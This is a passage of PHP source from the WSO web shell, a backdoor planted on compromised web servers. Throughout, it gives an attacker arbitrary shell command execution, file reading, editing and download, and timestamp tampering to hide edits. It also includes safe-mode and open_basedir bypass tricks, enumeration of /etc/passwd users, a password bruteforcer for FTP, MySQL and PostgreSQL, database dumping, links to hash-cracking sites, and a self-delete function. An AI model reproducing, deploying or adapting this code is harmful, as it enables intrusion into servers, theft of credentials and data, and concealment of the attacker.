			&lt;/table&gt;&lt;/form&gt;";

	function wsoRecursiveGlob($path) {
		if(substr($path, -1) != '/')
			$path.='/';
		$paths = @array_unique(@array_merge(@glob($path.$_POST['p3']), @glob($path.'*', GLOB_ONLYDIR)));
		if(is_array($paths)&&@count($paths)) {
			foreach($paths as $item) {
				if(@is_dir($item)){
					if($path!=$item)
						wsoRecursiveGlob($item);
				} else {
					if(@strpos(@file_get_contents($item), @$_POST['p2'])!==false)
						echo "&lt;a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($item)."\", \"view\")'&gt;".htmlspecialchars($item)."&lt;/a&gt;&lt;br&gt;";
				}
			}
		}
	}
	if(@$_POST['p3'])
		wsoRecursiveGlob($_POST['c']);
	echo "&lt;/div&gt;&lt;br&gt;&lt;h1&gt;Search for hash:&lt;/h1&gt;&lt;div class=content&gt;

		&lt;form method='post' target='_blank' name='hf'&gt;
			&lt;input type='text' name='hash' style='width:200px;'&gt;&lt;br&gt;
			&lt;input type='button' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"&gt;&lt;br&gt;
			&lt;input type='button' value='milw0rm.com' onclick=\"document.hf.action='http://www.milw0rm.com/cracker/search.php';document.hf.submit()\"&gt;&lt;br&gt;
			&lt;input type='button' value='hashcracking.info' onclick=\"document.hf.action='https://hashcracking.info/index.php';document.hf.submit()\"&gt;&lt;br&gt;
			&lt;input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"&gt;&lt;br&gt;
			&lt;input type='button' value='md5decrypter.com' onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()\"&gt;&lt;br&gt;
		&lt;/form&gt;&lt;/div&gt;";
	wsoFooter();
}

function actionFilesTools() {
	if( isset($_POST['p1']) )
		$_POST['p1'] = urldecode($_POST['p1']);
	if(@$_POST['p2']=='download') {
		if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
			ob_start("ob_gzhandler", 4096);
			header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
			if (function_exists("mime_content_type")) {
				$type = @mime_content_type($_POST['p1']);
				header("Content-Type: " . $type);
			} else
                header("Content-Type: application/octet-stream");
			$fp = @fopen($_POST['p1'], "r");
			if($fp) {
				while(!@feof($fp))
					echo @fread($fp, 1024);
				fclose($fp);
			}
		}exit;
	}
	if( @$_POST['p2'] == 'mkfile' ) {
		if(!file_exists($_POST['p1'])) {
			$fp = @fopen($_POST['p1'], 'w');
			if($fp) {
				$_POST['p2'] = "edit";
				fclose($fp);
			}
		}
	}
	wsoHeader();
	echo '&lt;h1&gt;File tools&lt;/h1&gt;&lt;div class=content&gt;';
	if( !file_exists(@$_POST['p1']) ) {
		echo 'File not exists';
		wsoFooter();
		return;
	}
	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
	if(!$uid) {
		$uid['name'] = @fileowner($_POST['p1']);
		$gid['name'] = @filegroup($_POST['p1']);
	} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
	echo '&lt;span&gt;Name:&lt;/span&gt; '.htmlspecialchars(@basename($_POST['p1'])).' &lt;span&gt;Size:&lt;/span&gt; '.(is_file($_POST['p1'])?wsoViewSize(filesize($_POST['p1'])):'-').' &lt;span&gt;Permission:&lt;/span&gt; '.wsoPermsColor($_POST['p1']).' &lt;span&gt;Owner/Group:&lt;/span&gt; '.$uid['name'].'/'.$gid['name'].'&lt;br&gt;';
	echo '&lt;span&gt;Create time:&lt;/span&gt; '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' &lt;span&gt;Access time:&lt;/span&gt; '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' &lt;span&gt;Modify time:&lt;/span&gt; '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'&lt;br&gt;&lt;br&gt;';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
		$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');
	else
		$m = array('Chmod', 'Rename', 'Touch');
	foreach($m as $v)
		echo '&lt;a href=# onclick="g(null,null,null,\''.strtolower($v).'\')"&gt;'.((strtolower($v)==@$_POST['p2'])?'&lt;b&gt;[ '.$v.' ]&lt;/b&gt;':$v).'&lt;/a&gt; ';
	echo '&lt;br&gt;&lt;br&gt;';
	switch($_POST['p2']) {
		case 'view':
			echo '&lt;pre class=ml1&gt;';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '&lt;/pre&gt;';
			break;
		case 'highlight':
			if( @is_readable($_POST['p1']) ) {
				echo '&lt;div class=ml1 style="background-color: #e1e1e1;color:black;"&gt;';
				$code = @highlight_file($_POST['p1'],true);
				echo str_replace(array('&lt;span ','&lt;/span&gt;'), array('&lt;font ','&lt;/font&gt;'),$code).'&lt;/div&gt;';
			}
			break;
		case 'chmod':
			if( !empty($_POST['p3']) ) {
				$perms = 0;
				for($i=strlen($_POST['p3'])-1;$i&gt;=0;--$i)
					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
				if(!@chmod($_POST['p1'], $perms))
					echo 'Can\'t set permissions!&lt;br&gt;&lt;script&gt;document.mf.p3.value="";&lt;/script&gt;';
			}
			clearstatcache();
			echo '&lt;script&gt;p3_="";&lt;/script&gt;&lt;form onsubmit="g(null,null,null,null,this.chmod.value);return false;"&gt;&lt;input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
			break;
		case 'edit':
			if( !is_writable($_POST['p1'])) {
				echo 'File isn\'t writeable';
				break;
			}
			if( !empty($_POST['p3']) ) {
				$time = @filemtime($_POST['p1']);
				$_POST['p3'] = substr($_POST['p3'],1);
				$fp = @fopen($_POST['p1'],"w");
				if($fp) {
					@fwrite($fp,$_POST['p3']);
					@fclose($fp);
					echo 'Saved!&lt;br&gt;&lt;script&gt;p3_="";&lt;/script&gt;';
					@touch($_POST['p1'],$time,$time);
				}
			}
			echo '&lt;form onsubmit="g(null,null,null,null,\'1\'+this.text.value);return false;"&gt;&lt;textarea name=text class=bigarea&gt;';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '&lt;/textarea&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
			break;
		case 'hexdump':
			$c = @file_get_contents($_POST['p1']);
			$n = 0;
			$h = array('00000000&lt;br&gt;','','');
			$len = strlen($c);
			for ($i=0; $i&lt;$len; ++$i) {
				$h[1] .= sprintf('X',ord($c[$i])).' ';
				switch ( ord($c[$i]) ) {
					case 0:  $h[2] .= ' '; break;
					case 9:  $h[2] .= ' '; break;
					case 10: $h[2] .= ' '; break;
					case 13: $h[2] .= ' '; break;
					default: $h[2] .= $c[$i]; break;
				}
				$n++;
				if ($n == 32) {
					$n = 0;
					if ($i+1 &lt; $len) {$h[0] .= sprintf('X',$i+1).'&lt;br&gt;';}
					$h[1] .= '&lt;br&gt;';
					$h[2] .= "\n";
				}
		 	}
			echo '&lt;table cellspacing=1 cellpadding=5 bgcolor=#222222&gt;&lt;tr&gt;&lt;td bgcolor=#333333&gt;&lt;span style="font-weight: normal;"&gt;&lt;pre&gt;'.$h[0].'&lt;/pre&gt;&lt;/span&gt;&lt;/td&gt;&lt;td bgcolor=#282828&gt;&lt;pre&gt;'.$h[1].'&lt;/pre&gt;&lt;/td&gt;&lt;td bgcolor=#333333&gt;&lt;pre&gt;'.htmlspecialchars($h[2]).'&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;';
			break;
		case 'rename':
			if( !empty($_POST['p3']) ) {
				if(!@rename($_POST['p1'], $_POST['p3']))
					echo 'Can\'t rename!&lt;br&gt;';
				else
					die('&lt;script&gt;g(null,null,"'.urlencode($_POST['p3']).'",null,"")&lt;/script&gt;');
			}
			echo '&lt;form onsubmit="g(null,null,null,null,this.name.value);return false;"&gt;&lt;input type=text name=name value="'.htmlspecialchars($_POST['p1']).'"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
			break;
		case 'touch':
			if( !empty($_POST['p3']) ) {
				$time = strtotime($_POST['p3']);
				if($time) {
					if(!touch($_POST['p1'],$time,$time))
						echo 'Fail!';
					else
						echo 'Touched!';
				} else echo 'Bad time format!';
			}
			clearstatcache();
			echo '&lt;script&gt;p3_="";&lt;/script&gt;&lt;form onsubmit="g(null,null,null,null,this.touch.value);return false;"&gt;&lt;input type=text name=touch value="'.date("Y-m-d H:i:s", @filemtime($_POST['p1'])).'"&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
			break;
	}
	echo '&lt;/div&gt;';
	wsoFooter();
}

function actionSafeMode() {
	$temp='';
	ob_start();
	switch($_POST['p1']) {
		case 1:
			$temp=@tempnam($test, 'cx');
			if(@copy("compress.zlib://".$_POST['p2'], $temp)){
				echo @file_get_contents($temp);
				unlink($temp);
			} else
				echo 'Sorry... Can\'t open file';
			break;
		case 2:
			$files = glob($_POST['p2'].'*');
			if( is_array($files) )
				foreach ($files as $filename)
					echo $filename."\n";
			break;
		case 3:
			$ch = curl_init("file://".$_POST['p2']."\x00".preg_replace('!\(\d+\)\s.*!', '', __FILE__));
			curl_exec($ch);
			break;
		case 4:
			ini_restore("safe_mode");
			ini_restore("open_basedir");
			include($_POST['p2']);
			break;
		case 5:
			for(;$_POST['p2'] &lt;= $_POST['p3'];$_POST['p2']++) {
				$uid = @posix_getpwuid($_POST['p2']);
				if ($uid)
					echo join(':',$uid)."\n";
			}
			break;
	}
	$temp = ob_get_clean();
	wsoHeader();
	echo '&lt;h1&gt;Safe mode bypass&lt;/h1&gt;&lt;div class=content&gt;';
	echo '&lt;span&gt;Copy (read file)&lt;/span&gt;&lt;form onsubmit=\'g(null,null,"1",this.param.value);return false;\'&gt;&lt;input type=text name=param&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Glob (list dir)&lt;/span&gt;&lt;form onsubmit=\'g(null,null,"2",this.param.value);return false;\'&gt;&lt;input type=text name=param&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Curl (read file)&lt;/span&gt;&lt;form onsubmit=\'g(null,null,"3",this.param.value);return false;\'&gt;&lt;input type=text name=param&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Ini_restore (read file)&lt;/span&gt;&lt;form onsubmit=\'g(null,null,"4",this.param.value);return false;\'&gt;&lt;input type=text name=param&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;&lt;br&gt;&lt;span&gt;Posix_getpwuid ("Read" /etc/passwd)&lt;/span&gt;&lt;table&gt;&lt;form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'&gt;&lt;tr&gt;&lt;td&gt;From&lt;/td&gt;&lt;td&gt;&lt;input type=text name=param1 value=0&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;To&lt;/td&gt;&lt;td&gt;&lt;input type=text name=param2 value=1000&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/form&gt;';
	if($temp)
		echo '&lt;pre class="ml1" style="margin-top:5px" id="Output"&gt;'.htmlspecialchars($temp).'&lt;/pre&gt;';
	echo '&lt;/div&gt;';
	wsoFooter();
}

function actionConsole() {
    if(!empty($_POST['p1']) && !empty($_POST['p2'])) {
        $_SESSION[md5($_SERVER['HTTP_HOST']).'stderr_to_out'] = true;
        $_POST['p1'] .= ' 2&gt;&1';
    } elseif(!empty($_POST['p1']))
        $_SESSION[md5($_SERVER['HTTP_HOST']).'stderr_to_out'] = false;

	if(isset($_POST['ajax'])) {
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = true;
		ob_start();
		echo "d.cf.cmd.value='';\n";
		$temp = @iconv($_POST['charset'], 'UTF-8', addcslashes("\n$ ".$_POST['p1']."\n".wsoEx($_POST['p1']),"\n\r\t\\'&#92;&#48;"));
		if(preg_match("!.*cd\s+([^;]+)$!",$_POST['p1'],$match))	{
			if(@chdir($match[1])) {
				$GLOBALS['cwd'] = @getcwd();
				echo "c_='".$GLOBALS['cwd']."';";
			}
		}
		echo "d.cf.output.value+='".$temp."';";
		echo "d.cf.output.scrollTop = d.cf.output.scrollHeight;";
		$temp = ob_get_clean();
		echo strlen($temp), "\n", $temp;
		exit;
	}
	wsoHeader();
    echo "&lt;script&gt;
if(window.Event) window.captureEvents(Event.KEYDOWN);
var cmds = new Array('');
var cur = 0;
function kp(e) {
	var n = (window.Event) ? e.which : e.keyCode;
	if(n == 38) {
		cur--;
		if(cur&gt;=0)
			document.cf.cmd.value = cmds[cur];
		else
			cur++;
	} else if(n == 40) {
		cur++;
		if(cur &lt; cmds.length)
			document.cf.cmd.value = cmds[cur];
		else
			cur--;
	}
}
function add(cmd) {
	cmds.pop();
	cmds.push(cmd);
	cmds.push('');
	cur = cmds.length-1;
}

&lt;/script&gt;";
	echo '&lt;h1&gt;Console&lt;/h1&gt;&lt;div class=content&gt;&lt;form name=cf onsubmit="if(d.cf.cmd.value==\'clear\'){d.cf.output.value=\'\';d.cf.cmd.value=\'\';return false;}add(this.cmd.value);if(this.ajax.checked){a(null,null,this.cmd.value,this.show_errors.checked?1:\'\');}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\'\');} return false;"&gt;&lt;select name=alias&gt;';
	foreach($GLOBALS['aliases'] as $n =&gt; $v) {
		if($v == '') {
			echo '&lt;optgroup label="-'.htmlspecialchars($n).'-"&gt;&lt;/optgroup&gt;';
			continue;
		}
		echo '&lt;option value="'.htmlspecialchars($v).'"&gt;'.$n.'&lt;/option&gt;';
	}
	if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax'] = false;
	echo '&lt;/select&gt;&lt;input type=button onclick="add(d.cf.alias.value);if(d.cf.ajax.checked){a(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}else{g(null,null,d.cf.alias.value,d.cf.show_errors.checked?1:\'\');}" value="&gt;&gt;"&gt; &lt;nobr&gt;&lt;input type=checkbox name=ajax value=1 '.(@$_SESSION[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'&gt; send using AJAX &lt;input type=checkbox name=show_errors value=1 '.(!empty($_POST['p2'])||$_SESSION[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'&gt; redirect stderr to stdout (2&gt;&1)&lt;/nobr&gt;&lt;br/&gt;&lt;textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly&gt;';
	if(!empty($_POST['p1'])) {
		echo htmlspecialchars("$ ".$_POST['p1']."\n".wsoEx($_POST['p1']));
	}
	echo '&lt;/textarea&gt;&lt;table style="border:1px solid #df5;background-color:#555;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"&gt;&lt;tr&gt;&lt;td width="1%"&gt;$&lt;/td&gt;&lt;td&gt;&lt;input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;';
	echo '&lt;/form&gt;&lt;/div&gt;&lt;script&gt;d.cf.cmd.focus();&lt;/script&gt;';
	wsoFooter();
}

function actionLogout() {
    session_destroy();
	die('bye!');
}

function actionSelfRemove() {

	if($_POST['p1'] == 'yes')
		if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
			die('Shell has been removed');
		else
			echo 'unlink error!';
    if($_POST['p1'] != 'yes')
        wsoHeader();
	echo '&lt;h1&gt;Suicide&lt;/h1&gt;&lt;div class=content&gt;Really want to remove the shell?&lt;br&gt;&lt;a href=# onclick="g(null,null,\'yes\')"&gt;Yes&lt;/a&gt;&lt;/div&gt;';
	wsoFooter();
}

function actionBruteforce() {
	wsoHeader();
	if( isset($_POST['proto']) ) {
		echo '&lt;h1&gt;Results&lt;/h1&gt;&lt;div class=content&gt;&lt;span&gt;Type:&lt;/span&gt; '.htmlspecialchars($_POST['proto']).' &lt;span&gt;Server:&lt;/span&gt; '.htmlspecialchars($_POST['server']).'&lt;br&gt;';
		if( $_POST['proto'] == 'ftp' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$fp = @ftp_connect($ip, $port?$port:21);
				if(!$fp) return false;
				$res = @ftp_login($fp, $login, $pass);
				@ftp_close($fp);
				return $res;
			}
		} elseif( $_POST['proto'] == 'mysql' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$res = @mysql_connect($ip.':'.$port?$port:3306, $login, $pass);
				@mysql_close($res);
				return $res;
			}
		} elseif( $_POST['proto'] == 'pgsql' ) {
			function bruteForce($ip,$port,$login,$pass) {
				$str = "host='".$ip."' port='".$port."' user='".$login."' password='".$pass."' dbname=postgres";
				$res = @pg_connect($str);
				@pg_close($res);
				return $res;
			}
		}
		$success = 0;
		$attempts = 0;
		$server = explode(":", $_POST['server']);
		if($_POST['type'] == 1) {
			$temp = @file('/etc/passwd');
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = explode(":", $line);
					++$attempts;
					if( bruteForce(@$server[0],@$server[1], $line[0], $line[0]) ) {
						$success++;
						echo '&lt;b&gt;'.htmlspecialchars($line[0]).'&lt;/b&gt;:'.htmlspecialchars($line[0]).'&lt;br&gt;';
					}
					if(@$_POST['reverse']) {
						$tmp = "";
						for($i=strlen($line[0])-1; $i&gt;=0; --$i)
							$tmp .= $line[0][$i];
						++$attempts;
						if( bruteForce(@$server[0],@$server[1], $line[0], $tmp) ) {
							$success++;
							echo '&lt;b&gt;'.htmlspecialchars($line[0]).'&lt;/b&gt;:'.htmlspecialchars($tmp);
						}
					}
				}
		} elseif($_POST['type'] == 2) {
			$temp = @file($_POST['dict']);
			if( is_array($temp) )
				foreach($temp as $line) {
					$line = trim($line);
					++$attempts;
					if( bruteForce($server[0],@$server[1], $_POST['login'], $line) ) {
						$success++;
						echo '&lt;b&gt;'.htmlspecialchars($_POST['login']).'&lt;/b&gt;:'.htmlspecialchars($line).'&lt;br&gt;';
					}
				}
		}
		echo "&lt;span&gt;Attempts:&lt;/span&gt; $attempts &lt;span&gt;Success:&lt;/span&gt; $success&lt;/div&gt;&lt;br&gt;";
	}
	echo '&lt;h1&gt;FTP bruteforce&lt;/h1&gt;&lt;div class=content&gt;&lt;table&gt;&lt;form method=post&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Type&lt;/span&gt;&lt;/td&gt;'
		.'&lt;td&gt;&lt;select name=proto&gt;&lt;option value=ftp&gt;FTP&lt;/option&gt;&lt;option value=mysql&gt;MySql&lt;/option&gt;&lt;option value=pgsql&gt;PostgreSql&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;'
		.'&lt;input type=hidden name=c value="'.htmlspecialchars($GLOBALS['cwd']).'"&gt;'
		.'&lt;input type=hidden name=a value="'.htmlspecialchars($_POST['a']).'"&gt;'
		.'&lt;input type=hidden name=charset value="'.htmlspecialchars($_POST['charset']).'"&gt;'
		.'&lt;span&gt;Server:port&lt;/span&gt;&lt;/td&gt;'
		.'&lt;td&gt;&lt;input type=text name=server value="127.0.0.1"&gt;&lt;/td&gt;&lt;/tr&gt;'
		.'&lt;tr&gt;&lt;td&gt;&lt;span&gt;Brute type&lt;/span&gt;&lt;/td&gt;'
		.'&lt;td&gt;&lt;label&gt;&lt;input type=radio name=type value="1" checked&gt; /etc/passwd&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;'
		.'&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;label style="padding-left:15px"&gt;&lt;input type=checkbox name=reverse value=1 checked&gt; reverse (login -&gt; nigol)&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;'
		.'&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;label&gt;&lt;input type=radio name=type value="2"&gt; Dictionary&lt;/label&gt;&lt;/td&gt;&lt;/tr&gt;'
		.'&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;table style="padding-left:15px"&gt;&lt;tr&gt;&lt;td&gt;&lt;span&gt;Login&lt;/span&gt;&lt;/td&gt;'
		.'&lt;td&gt;&lt;input type=text name=login value="root"&gt;&lt;/td&gt;&lt;/tr&gt;'
		.'&lt;tr&gt;&lt;td&gt;&lt;span&gt;Dictionary&lt;/span&gt;&lt;/td&gt;'
		.'&lt;td&gt;&lt;input type=text name=dict value="'.htmlspecialchars($GLOBALS['cwd']).'passwd.dic"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;'
		.'&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit value="&gt;&gt;"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;';
	echo '&lt;/div&gt;&lt;br&gt;';
	wsoFooter();
}

function actionSql() {
	class DbClass {
		var $type;
		var $link;
		var $res;
		function DbClass($type)	{
			$this-&gt;type = $type;
		}
		function connect($host, $user, $pass, $dbname){
			switch($this-&gt;type)	{
				case 'mysql':
					if( $this-&gt;link = @mysql_connect($host,$user,$pass,true) ) return true;
					break;
				case 'pgsql':
					$host = explode(':', $host);
					if(!$host[1]) $host[1]=5432;
					if( $this-&gt;link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname") ) return true;
					break;
			}
			return false;
		}
		function selectdb($db) {
			switch($this-&gt;type)	{
				case 'mysql':
					if (@mysql_select_db($db))return true;
					break;
			}
			return false;
		}
		function query($str) {
			switch($this-&gt;type) {
				case 'mysql':
					return $this-&gt;res = @mysql_query($str);
					break;
				case 'pgsql':
					return $this-&gt;res = @pg_query($this-&gt;link,$str);
					break;
			}
			return false;
		}
		function fetch() {
			$res = func_num_args()?func_get_arg(0):$this-&gt;res;
			switch($this-&gt;type)	{
				case 'mysql':
					return @mysql_fetch_assoc($res);
					break;
				case 'pgsql':
					return @pg_fetch_assoc($res);
					break;
			}
			return false;
		}
		function listDbs() {
			switch($this-&gt;type)	{
				case 'mysql':
                        return $this-&gt;query("SHOW databases");
				break;
				case 'pgsql':
					return $this-&gt;res = $this-&gt;query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
				break;
			}
			return false;
		}
		function listTables() {
			switch($this-&gt;type)	{
				case 'mysql':
					return $this-&gt;res = $this-&gt;query('SHOW TABLES');
				break;
				case 'pgsql':
					return $this-&gt;res = $this-&gt;query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
				break;
			}
			return false;
		}
		function error() {
			switch($this-&gt;type)	{
				case 'mysql':
					return @mysql_error();
				break;
				case 'pgsql':
					return @pg_last_error();
				break;
			}
			return false;
		}
		function setCharset($str) {
			switch($this-&gt;type)	{
				case 'mysql':
					if(function_exists('mysql_set_charset'))
						return @mysql_set_charset($str, $this-&gt;link);
					else
						$this-&gt;query('SET CHARSET '.$str);
					break;
				case 'pgsql':
					return @pg_set_client_encoding($this-&gt;link, $str);
					break;
			}
			return false;
		}
		function loadFile($str) {
			switch($this-&gt;type)	{
				case 'mysql':
					return $this-&gt;fetch($this-&gt;query("SELECT LOAD_FILE('".addslashes($str)."') as file"));
				break;
				case 'pgsql':
					$this-&gt;query("CREATE TABLE wso2(file text);COPY wso2 FROM '".addslashes($str)."';select file from wso2;");
					$r=array();
					while($i=$this-&gt;fetch())
						$r[] = $i['file'];
					$this-&gt;query('drop table wso2');
					return array('file'=&gt;implode("\n",$r));
				break;
			}
			return false;
		}
		function dump($table, $fp = false) {
			switch($this-&gt;type)	{
				case 'mysql':
					$res = $this-&gt;query('SHOW CREATE TABLE `'.$table.'`');
					$create = mysql_fetch_array($res);
					$sql = $create[1].";\n";
                    if($fp) fwrite($fp, $sql); else echo($sql);
					$this-&gt;query('SELECT * FROM `'.$table.'`');
                    $head = true;
					while($item = $this-&gt;fetch()) {
						$columns = array();
						foreach($item as $k=&gt;$v) {
                            if($v == null)
                                $item[$k] = "NULL";
                            elseif(is_numeric($v))
                                $item[$k] = $v;
                            else
                                $item[$k] = "'".@mysql_real_escape_string($v)."'";
							$columns[] = "`".$k."`";
						}
                        if($head) {
                            $sql = 'INSERT INTO `'.$table.'` ('.implode(", ", $columns).") VALUES \n\t(".implode(", ", $item).')';
                            $head = false;
                        } else
                            $sql = "\n\t,(".implode(", ", $item).')';
                        if($fp) fwrite($fp, $sql); else echo($sql);
					}
                    if(!$head)
                        if($fp) fwrite($fp, ";\n\n"); else echo(";\n\n");
				break;
				case 'pgsql':
					$this-&gt;query('SELECT * FROM '.$table);
					while($item = $this-&gt;fetch()) {
						$columns = array();
						foreach($item as $k=&gt;$v) {
							$item[$k] = "'".addslashes($v)."'";
							$columns[] = $k;
						}
                        $sql = 'INSERT INTO '.$table.' ('.implode(", ", $columns).') VALUES ('.implode(", ", $item).');'."\n";
                        if($fp) fwrite($fp, $sql); else echo($sql);
					}
				break;
			}
			return false;
		}
	};
	$db = new DbClass($_POST['type']);
	if(@$_POST['p2']=='download') {
		$db-&gt;connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
		$db-&gt;selectdb($_POST['sql_base']);
        switch($_POST['charset']) {
            case "Windows-1251": $db-&gt;setCharset('cp1251'); break;
            case "UTF-8": $db-&gt;setCharset('utf8'); break;
            case "KOI8-R": $db-&gt;setCharset('koi8r'); break;
            case "KOI8-U": $db-&gt;setCharset('koi8u'); break;
            case "cp866": $db-&gt;setCharset('cp866'); break;
        }
        if(empty($_POST['file'])) {
            ob_start("ob_gzhandler", 4096);
            header("Content-Disposition: attachment; filename=dump.sql");
            header("Content-Type: text/plain");
            foreach($_POST['tbl'] as $v)
				$db-&gt;dump($v);
            exit;
        } elseif($fp = @fopen($_POST['file'], 'w')) {
            foreach($_POST['tbl'] as $v)
                $db-&gt;dump($v, $fp);
            fclose($fp);
            unset($_POST['p2']);
        } else
            die('&lt;script&gt;alert("Error! Can\'t open file");window.history.back(-1)&lt;/script&gt;');
	}
	wsoHeader();
	echo "

&lt;h1&gt;Sql browser&lt;/h1&gt;&lt;div class=content&gt;
&lt;form name='sf' method='post' onsubmit='fs(this);'&gt;&lt;table cellpadding='2' cellspacing='0'&gt;&lt;tr&gt;
&lt;td&gt;Type&lt;/td&gt;&lt;td&gt;Host&lt;/td&gt;&lt;td&gt;Login&lt;/td&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;Database&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;
&lt;input type=hidden name=a value=Sql&gt;&lt;input type=hidden name=p1 value='query'&gt;&lt;input type=hidden name=p2 value=''&gt;&lt;input type=hidden name=c value='". htmlspecialchars($GLOBALS['cwd']) ."'&gt;&lt;input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'') ."'&gt;
&lt;td&gt;&lt;select name='type'&gt;&lt;option value='mysql' ";
    if(@$_POST['type']=='mysql')echo 'selected';
echo "&gt;MySql&lt;/option&gt;&lt;option value='pgsql' ";
if(@$_POST['type']=='pgsql')echo 'selected';
echo "&gt;PostgreSql&lt;/option&gt;&lt;/select&gt;&lt;/td&gt;
&lt;td&gt;&lt;input type=text name=sql_host value='". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."'&gt;&lt;/td&gt;
&lt;td&gt;&lt;input type=text name=sql_login value='". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."'&gt;&lt;/td&gt;
&lt;td&gt;&lt;input type=text name=sql_pass value='". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."'&gt;&lt;/td&gt;&lt;td&gt;";
	$tmp = "&lt;input type=text name=sql_base value=''&gt;";
	if(isset($_POST['sql_host'])){
		if($db-&gt;connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
			switch($_POST['charset']) {
				case "Windows-1251": $db-&gt;setCharset('cp1251'); break;
				case "UTF-8": $db-&gt;setCharset('utf8'); break;
				case "KOI8-R": $db-&gt;setCharset('koi8r'); break;
				case "KOI8-U": $db-&gt;setCharset('koi8u'); break;
				case "cp866": $db-&gt;setCharset('cp866'); break;
			}
			$db-&gt;listDbs();
			echo "&lt;select name=sql_base&gt;&lt;option value=''&gt;&lt;/option&gt;";
			while($item = $db-&gt;fetch()) {
				list($key, $value) = each($item);
				echo '&lt;option value="'.$value.'" '.($value==$_POST['sql_base']?'selected':'').'&gt;'.$value.'&lt;/option&gt;';
			}
			echo '&lt;/select&gt;';
		}
		else echo $tmp;
	}else
		echo $tmp;
	echo "&lt;/td&gt;

				&lt;td&gt;&lt;input type=submit value='&gt;&gt;' onclick='fs(d.sf);'&gt;&lt;/td&gt;
                &lt;td&gt;&lt;input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count'])?'':' checked') . "&gt; count the number of rows&lt;/td&gt;
			&lt;/tr&gt;
		&lt;/table&gt;
		&lt;script&gt;
            s_db='".@addslashes($_POST['sql_base'])."';
            function fs(f) {
                if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
                    if(f.p1) f.p1.value='';
